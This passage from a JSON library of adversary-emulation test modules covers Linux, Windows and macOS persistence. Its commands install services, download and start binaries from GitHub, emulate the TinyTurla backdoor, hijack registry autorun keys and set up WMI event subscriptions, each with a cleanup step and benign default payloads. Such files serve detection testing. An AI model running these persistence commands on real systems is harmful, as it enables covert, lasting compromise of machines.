/etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n",
        "elevation_required": true,
        "cleanup_command": "systemctl stop T1543.002\nsystemctl disable T1543.002\nrm -rf /etc/init.d/T1543.002\nsystemctl daemon-reload\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "System must be Ubuntu ,Kali OR CentOS.\n",
          "check_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then exit /b 0; else exit /b 1; fi;\n",
          "install_command": "echo Please run from Ubuntu ,Kali OR CentOS.\n"
        }
      ],
      "rx_module_id": "c35ac4a8-19de-43af-b9f8-755da7e89c89",
      "module_name": "Create Systemd Service file,  Enable the service , Modify and Reload the service."
    },
    {
      "index": 1208,
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc config #{service_name} binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "sc config #{service_name} binPath= \"#{service_binpath}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "The name of the service that will be modified",
          "type": "string",
          "default_value": "Fax"
        },
        {
          "name": "service_binpath",
          "description": "The default value for the binary path of the service",
          "type": "string",
          "default_value": "C:\\WINDOWS\\system32\\fxssvc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ed366cde-7d12-49df-a833-671904770b9f",
      "module_name": "Modify Fax service to run PowerShell"
    },
    {
      "index": 1209,
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `RAGLOXService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type}  type=#{service_type}\nsc.exe start #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "sc.exe stop #{service_name} >nul 2>&1\nsc.exe delete #{service_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "binary_path",
          "description": "Name of the service binary, include path.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1543.003\\bin\\RAGLOXService.exe"
        },
        {
          "name": "service_type",
          "description": "Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare",
          "type": "string",
          "default_value": "Own"
        },
        {
          "name": "startup_type",
          "description": "Service start method. May be boot|system|auto|demand|disabled|delayed-auto",
          "type": "string",
          "default_value": "auto"
        },
        {
          "name": "service_name",
          "description": "Name of the Service",
          "type": "string",
          "default_value": "RAGLOXTestService_CMD"
        }
      ],
      "prerequisites": [
        {
          "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
          "check_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1543.003/bin/RAGLOXService.exe\" -OutFile \"#{binary_path}\"\n"
        }
      ],
      "rx_module_id": "981e2942-e433-44e9-afc1-8c957a1496b6",
      "module_name": "Service Installation CMD"
    },
    {
      "index": 1210,
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `RAGLOXService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}\n"
      },
      "variables": [
        {
          "name": "binary_path",
          "description": "Name of the service binary, include path.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1543.003\\bin\\RAGLOXService.exe"
        },
        {
          "name": "service_name",
          "description": "Name of the Service",
          "type": "string",
          "default_value": "RAGLOXTestService_PowerShell"
        }
      ],
      "prerequisites": [
        {
          "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
          "check_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1543.003/bin/RAGLOXService.exe\" -OutFile \"#{binary_path}\"\n"
        }
      ],
      "rx_module_id": "491a4af6-a521-4b74-b23b-f7b3f1ee9e77",
      "module_name": "Service Installation PowerShell"
    },
    {
      "index": 1211,
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy \"#{dllfilename}\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time",
        "elevation_required": true,
        "cleanup_command": "sc stop W64Time\nsc.exe delete W64Time\ndel %systemroot%\\system32\\w64time.dll\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f"
      },
      "variables": [
        {
          "name": "dllfilename",
          "description": "It specifies Dll file to run as service",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder\\T1543.003\\bin\\w64time.dll"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ef0581fd-528e-4662-87bc-4c2affb86940",
      "module_name": "TinyTurla backdoor service w64time"
    },
    {
      "index": 1212,
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `RAGLOXService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe \\\\#{remote_host} create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type} type=#{service_type}\nsc.exe \\\\#{remote_host} start #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "sc.exe \\\\#{remote_host} stop #{service_name} >nul 2>&1\nsc.exe \\\\#{remote_host} delete #{service_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "binary_path",
          "description": "Name of the service binary, include path.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1543.003\\bin\\RAGLOXService.exe"
        },
        {
          "name": "service_type",
          "description": "Type of service. May be own,share,interact,kernel,filesys,rec,userown,usershare",
          "type": "string",
          "default_value": "Own"
        },
        {
          "name": "startup_type",
          "description": "Service start method. May be boot,system,auto,demand,disabled,delayed-auto",
          "type": "string",
          "default_value": "auto"
        },
        {
          "name": "service_name",
          "description": "Name of the Service",
          "type": "string",
          "default_value": "RAGLOXTestService_CMD"
        },
        {
          "name": "remote_host",
          "description": "Name of the remote endpoint",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [
        {
          "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
          "check_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1543.003/bin/RAGLOXService.exe\" -OutFile \"#{binary_path}\"\n"
        }
      ],
      "rx_module_id": "fb4151a2-db33-4f8c-b7f8-78ea8790f961",
      "module_name": "Remote Service Installation CMD"
    },
    {
      "index": 1213,
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "description": "This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.\nThis technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{new_bin_path}\"\nstart-service -Name \"#{service_name}\" -erroraction silentlycontinue | out-null",
        "elevation_required": true,
        "cleanup_command": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{original_bin_path}\" -erroraction silentlycontinue | out-null"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "Name of the service to modify",
          "type": "string",
          "default_value": "fax"
        },
        {
          "name": "new_bin_path",
          "description": "Path of the new service binary",
          "type": "String",
          "default_value": "$env:windir\\system32\\notepad.exe"
        },
        {
          "name": "original_bin_path",
          "description": "Path of the original service binary",
          "type": "String",
          "default_value": "$env:windir\\system32\\fxssvc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1f896ce4-8070-4959-8a25-2658856a70c9",
      "module_name": "Modify Service to Run Arbitrary Binary (Powershell)"
    },
    {
      "index": 1214,
      "technique_id": "T1543.004",
      "technique_name": "Create or Modify System Process: Launch Daemon",
      "description": "Utilize LaunchDaemon to launch `Hello World`\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}\nsudo rm /Library/LaunchDaemons/#{plist_filename}\nsudo rm /tmp/T1543_004_raglox.txt\n"
      },
      "variables": [
        {
          "name": "plist_filename",
          "description": "filename",
          "type": "string",
          "default_value": "com.raglox.plist"
        },
        {
          "name": "path_malicious_plist",
          "description": "Name of file to store in cron folder",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1543.004/src/raglox_T1543_004.plist"
        }
      ],
      "prerequisites": [
        {
          "description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
          "check_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf",
      "module_name": "Launch Daemon"
    },
    {
      "index": 1215,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToRagloxModulesFolder\\T1546\\bin\\AltWinSock2DLL.dll\n",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value  $env:windir\\system32\\rasadhlp.dll"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "AltWinSock2DLL DLL must exist on disk at specified at PathToRagloxModulesFolder\\T1546\\bin\\AltWinSock2DLL.dll\n",
          "check_command": "if (Test-Path PathToRagloxModulesFolder\\T1546\\bin\\AltWinSock2DLL.dll) { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToRagloxModulesFolder\\T1546\\bin\\AltWinSock2DLL.dll\"\n"
        }
      ],
      "rx_module_id": "aca9ae16-7425-4b6d-8c30-cad306fdbd5b",
      "module_name": "Persistence with Custom AutodialDLL"
    },
    {
      "index": 1216,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to Execute",
          "type": "string",
          "default_value": "notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a574dafe-a903-4cce-9701-14040f4f3532",
      "module_name": "HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)"
    },
    {
      "index": 1217,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to Execute",
          "type": "string",
          "default_value": "notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "36b8dbf9-59b1-4e9b-a3bb-36e80563ef01",
      "module_name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)"
    },
    {
      "index": 1218,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "The following RAGLOX will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Set the remote computer name and credentials\n $RemoteComputer = \"#{dest}\"\n $PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"#{process}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dest",
          "description": "destination computer name",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "password",
          "description": "password for account",
          "type": "string",
          "default_value": "P@ssword1"
        },
        {
          "name": "username",
          "description": "account to use",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "process",
          "description": "process to spawn",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "adae83d3-0df6-45e7-b2c3-575f91584577",
      "module_name": "WMI Invoke-CimMethod Start Process"
    },
    {
      "index": 1219,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry.\nAdding executable of choice will let the executable to auto-execute when during any application crash due to functioning of WER framework\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "17d1a3cc-3373-495a-857a-e5dd005fb302",
      "module_name": "Adding custom debugger for Windows Error Reporting"
    },
    {
      "index": 1220,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "Adding ClxDllPath under Terminal Server Client subkey of HKLM hive with a path to custom DLL allows for DLL loading during execution of mstsc.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Terminal Server Client\" /v ClxDllPath /t REG_SZ /d \"#{dll_inf}\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Terminal Server Client\" /v ClxDllPath /f      "
      },
      "variables": [
        {
          "name": "dll_inf",
          "description": "custom DLL to be executed",
          "type": "Path",
          "default_value": "C:\\Windows\\System32\\amsi.dll"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2db7852e-5a32-4ec7-937f-f4e027881700",
      "module_name": "Load custom DLL on mstsc execution"
    },
    {
      "index": 1221,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "When remote desktop session is accepted, the system queries the key it queries the Registry key:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin. \nIf such key exists, the OS will attempt to read the Path value underneath.Once the Path is read, the DLL that it points to will be loaded via LoadLibrary.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /v Path /t REG_SZ /d \"C:\\Windows\\System32\\amsi.dll\" /f",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b7fc4c3f-fe6e-479a-ba27-ef91b88536e3",
      "module_name": "Persistence using automatic execution of custom DLL during RDP session"
    },
    {
      "index": 1222,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.\nUpon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item -Path PathToRagloxModulesFolder\\T1546\\src\\ErrorHandler.cmd -Destination C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd\nC:\\windows\\System32\\oobe\\Setup\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd      "
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "ErrorHandler.cmd script must exist on disk at specified at PathToRagloxModulesFolder\\T1546\\bin\\ErrorHandler.cmd\n",
          "check_command": "if (Test-Path PathToRagloxModulesFolder\\T1546\\src\\ErrorHandler.cmd) { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1546\\src\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546/src/ErrorHandler.cmd\" -OutFile \"PathToRagloxModulesFolder\\T1546\\src\\ErrorHandler.cmd\"      \n"
        }
      ],
      "rx_module_id": "547a4736-dd1c-4b48-b4fe-e916190bb2e7",
      "module_name": "Persistence via ErrorHandler.cmd script execution"
    },
    {
      "index": 1223,
      "technique_id": "T1546",
      "technique_name": "Event Triggered Execution",
      "description": "When Word starts, it searches for the registry key HKCU\\Software\\Microsoft\\Office\\<version>\\Word\\Options\\STARTUP-PATH and if it exists,\nit will treat it as a user specific start-up folder and load the contents of the folder with file extensions of .wll,.lnk,.dotm,.dot,.dotx\nThe registry key can be abused to load malware from the mentioned path. Reboot might be required.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /v STARTUP-PATH /t REG_SZ /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f",
        "elevation_required": true,
        "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options /v STARTUP-PATH /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f0027655-25ef-47b0-acaf-3d83d106156c",
      "module_name": "Persistence using STARTUP-PATH in MS-WORD"
    },
    {
      "index": 1224,
      "technique_id": "T1546.001",
      "technique_name": "Event Triggered Execution: Change Default File Association",
      "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "assoc #{extension_to_change}=#{target_extension_handler}\n",
        "elevation_required": true,
        "cleanup_command": "assoc  #{extension_to_change}=#{original_extension_handler}\n"
      },
      "variables": [
        {
          "name": "target_extension_handler",
          "description": "txtfile maps to notepad.exe",
          "type": "path",
          "default_value": "txtfile"
        },
        {
          "name": "extension_to_change",
          "description": "File Extension To Hijack",
          "type": "string",
          "default_value": ".hta"
        },
        {
          "name": "original_extension_handler",
          "description": "File Extension To Revert",
          "type": "string",
          "default_value": "htafile"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "10a08978-2045-4d62-8c42-1957bbbea102",
      "module_name": "Change Default File Association"
    },
    {
      "index": 1225,
      "technique_id": "T1546.002",
      "technique_name": "Event Triggered Execution: Screensaver",
      "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n",
        "elevation_required": true,
        "cleanup_command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr\n"
      },
      "variables": [
        {
          "name": "input_binary",
          "description": "Executable binary to use in place of screensaver for persistence",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        },
        {
          "name": "reboot",
          "description": "Set to non-zero value if you want the test to reboot the system so that changes take effect",
          "type": "integer",
          "default_value": 0
        }
      ],
      "prerequisites": [],
      "rx_module_id": "281201e7-de41-4dc9-b73d-f288938cbb64",
      "module_name": "Set Arbitrary Binary as Screensaver"
    },
    {
      "index": 1226,
      "technique_id": "T1546.003",
      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$FilterArgs = @{name='RAGLOXRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='RAGLOXRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n",
        "elevation_required": true,
        "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'RAGLOXRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'RAGLOXRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3c64f177-28e2-49eb-a799-d767b24dd1e0",
      "module_name": "Persistence via WMI Event Subscription - CommandLineEventConsumer"
    },
    {
      "index": 1227,
      "technique_id": "T1546.003",
      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$FilterArgs = @{name='RAGLOXRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='RAGLOXRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments 